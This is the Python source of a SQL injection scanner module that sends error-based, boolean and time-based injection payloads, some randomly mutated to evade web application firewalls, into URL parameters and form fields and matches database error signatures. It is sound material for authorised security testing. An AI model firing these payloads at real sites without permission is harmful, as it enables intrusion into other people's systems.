import time
import logging
import random
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from websecure.scanners.base import BaseScanner
from websecure.core.mutator import Mutator
from websecure.core.reporting import add_result

logger = logging.getLogger(__name__)

class SQLInjectionScanner(BaseScanner):
    """
    Robust SQL Injection Scanner.
    Features:
    - Error-based detection (using regex signatures)
    - Boolean-based blind detection (content length/hash comparison)
    - Time-based blind detection (sleep payloads)
    - WAF Evasion integration via Mutator
    """
    
    # Signatures for Error-Based SQLi
    ERRORS = {
        "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
        "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
        "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\."),
        "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
        "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
        "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
        "Sybase": (r"(?i)Sybase message", r"Sybase.*Server message", r"SybSQLException"),
    }

    def __init__(self, session=None, results=None, debug=False):
        super().__init__(session, results, debug)
        self.payloads = self._load_payloads()

    def _load_payloads(self):
        """Loads basic payloads. Real implementation should load from payloads.py/wordlists."""
        # Simplified list for robust implementation
        return [
            # Standard
            "'", '"', "')", '");',
            # Logic
            "' OR '1'='1", '" OR "1"="1', 
            "' OR 1=1--", '" OR 1=1--',
            # Union
            "' UNION SELECT 1,2,3--", '" UNION SELECT 1,2,3--',
            # Error triggering
            "' AND 1=0 UNION SELECT 1,version()--",
            # Time-based (Generic)
            "'; WAITFOR DELAY '0:0:5'--", # MSSQL
            "'; SELECT SLEEP(5)--", # MySQL
            "' || pg_sleep(5)--", # Postgres
        ]

    def run(self, url: str | List[str], **kwargs):
        """
        Scans a single URL or list of URLs for SQLi.
        """
        if isinstance(url, list):
            for u in url:
                self.scan_url(u)
        else:
            self.scan_url(url)

        # [WS3] Deep Input Scan (Forms)
        pages_with_forms = self.results.get("forms_meta", [])
        if pages_with_forms:
            all_forms = []
            for page in pages_with_forms:
                if "forms" in page:
                    all_forms.extend(page["forms"])
            
            if all_forms:
                self.scan_forms(all_forms)



    def scan_url(self, url: str):
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        if not params:
            return # No parameters to inject

        logger.info(f"Scanning for SQLi: {url}")
        
        # Baseline request
        try:
            baseline = self.session.get(url, timeout=10)
            base_len = len(baseline.text)
        except Exception:
            return

        for param_name, param_val in params:
            # 1. Error-Based & Boolean-Based Checks
            for payload in self.payloads:
                # [Optimization] Mutate randomly for WAF evasion
                if random.random() < 0.3:
                    mutated_list = Mutator.mutate_sql(payload)
                    curr_payload = random.choice(mutated_list) if mutated_list else payload
                else:
                    curr_payload = payload

                invoked_url = self._inject_param(url, param_name, curr_payload)
                
                start_t = time.time()
                try:
                    res = self.session.get(invoked_url, timeout=10)
                    elapsed = time.time() - start_t
                except Exception:
                    continue

                # Check Errors
                for db, regexes in self.ERRORS.items():
                    for r in regexes:
                        if re.search(r, res.text, re.I):
                            self._report_vuln("SQL Injection (Error)", url, param_name, curr_payload, f"DB: {db}, Error detected")
                            return # Stop testing this param if vuln found

                # Check Time-Based
                if "SLEEP" in curr_payload or "WAITFOR" in curr_payload or "pg_sleep" in curr_payload:
                    if elapsed > 4.5: # Simple threshold
                         self._report_vuln("SQL Injection (Time-Based)", url, param_name, curr_payload, f"Response time: {elapsed:.2f}s")
                         return

    def _inject_param(self, url: str, key: str, val: str) -> str:
        """Injects a payload into a specific query parameter."""
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query))
        params[key] = val
        new_query = urlencode(params)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def _report_vuln(self, title, url, param, payload, info):
        add_result("offensive", {
            "type": title,
            "severity": "Critical",
            "url": url,
            "parameter": param,
            "payload": payload,
            "info": info
        })
        logger.warning(f"!!! {title} FOUND: {url} (Param: {param})")
            
    def scan_forms(self, forms: List[Dict]):
        """
        Iterates over discovered forms and injects SQLi payloads.
        """
        logger.info(f"Scanning {len(forms)} forms for SQLi (Deep Input)...")
        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            inputs = form.get("inputs", [])
            
            if not action or not inputs: continue
            
            # Fuzz everything except buttons/binary (Blacklist approach)
            skipped_types = {"submit", "button", "image", "reset", "file", "checkbox", "radio"}
            fuzzable = [i for i in inputs if i.get("type", "text") not in skipped_types]

            
            for inp in fuzzable:
                p_name = inp.get("name")
                if not p_name: continue
                
                # Use smaller payload set for forms to be fast
                payloads = self.payloads[:8] # Top 8 most effective
                
                for payload in payloads:
                    form_data = {i.get("name"): i.get("value", "") for i in inputs if i.get("name")}
                    req_kw = self.prepare_injection(action, p_name, payload, method, data=form_data)
                    
                    try:
                        start_t = time.time()
                        if method == "POST":
                            res = self.session.post(req_kw.get("url", action), data=req_kw.get("data"), timeout=10)
                        else:
                            res = self.session.get(req_kw.get("url", action), timeout=10)
                        elapsed = time.time() - start_t
                        
                        # Check Errors
                        for db, regexes in self.ERRORS.items():
                             for r in regexes:
                                 if re.search(r, res.text, re.I):
                                     self._report_vuln("SQLi (Form/Error)", action, p_name, payload, f"DB: {db}")
                                     break
                        
                        # Check Time
                        if "SLEEP" in payload or "WAITFOR" in payload:
                            if elapsed > 4.5:
                                self._report_vuln("SQLi (Form/Time)", action, p_name, payload, f"Response: {elapsed:.2f}s")
                                
                    except Exception:
                        pass


# Bridge function for dynamic loading
def run(url, session=None, results=None, debug=False, **kwargs):
    scanner = SQLInjectionScanner(session, results, debug)
    scanner.run(url)
